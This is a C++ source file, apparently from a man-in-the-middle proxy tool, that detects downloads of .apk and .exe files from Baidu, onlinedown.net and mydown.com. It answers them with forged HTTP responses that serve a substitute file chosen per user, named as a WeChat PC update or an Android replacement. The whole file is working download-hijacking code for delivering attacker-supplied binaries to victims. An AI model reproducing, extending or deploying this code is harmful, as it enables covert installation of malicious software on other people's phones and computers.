#include "browserdownload.h"
#include "PluginServer.h"
#include "../attacker.h"
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../FileOper.h"

int gBaiduDownloadFlag = 0;


int BrowserDownload::isBrowserDownload(const char* url, const char* host) {
	if (strstr(host, "gdown.baidu.com") && strstr(url, "/data/wisegame/")) {
		if (strstr(url, ".apk"))
		{
			gBaiduDownloadFlag = 1;
			return TRUE;
		}
		else if (strstr(url, ".exe"))
		{
			gBaiduDownloadFlag = 2;
			return TRUE;
		}
	}
	else	if (strstr(host, ".onlinedown.net") && strstr(url, "/down/")) {
		if (strstr(url, ".apk"))
		{
			gBaiduDownloadFlag = 1;
			return TRUE;
		}
		else if (strstr(url, ".exe"))
		{
			gBaiduDownloadFlag = 2;
			return TRUE;
		}
	}
	else	if (strstr(host, "api.mydown.com") && strstr(url, "/download/")) {
		if (strstr(url, ".apk"))
		{
			gBaiduDownloadFlag = 1;
			return TRUE;
		}
		else if (strstr(url, ".exe"))
		{
			gBaiduDownloadFlag = 2;
			return TRUE;
		}
	}

	return FALSE;
}


int BrowserDownload::replyBrowserDownload(char* dstbuf, int len, int dstbuflimit, LPHTTPPROXYPARAM lphttp) {

	char* szHttpExeFormat = "HTTP/1.1 200 OK\r\n"
		"Connection: keep-alive\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Content-Length: %u\r\n\r\n";

	char* szHttpApkFormat = "HTTP/1.1 200 OK\r\n"
		"Connection: keep-alive\r\n"
		"Content-Type: application/vnd.android.package-archive\r\n"
		"Content-Length: %u\r\n\r\n";

	if (gBaiduDownloadFlag == 2)
	{
		string filename = Public::getUserUrl(lphttp->username, WEIXIN_PC_UPDATE_EXE_FILENAME);
		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpExeFormat, 1);
		return 0;
	}
	else if (gBaiduDownloadFlag == 1)
	{
		string filename = Public::getUserUrl(lphttp->username, ANDROID_REPLACE_FILENAME);
		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpApkFormat, 1);
		return 0;
	}

	return 0;
}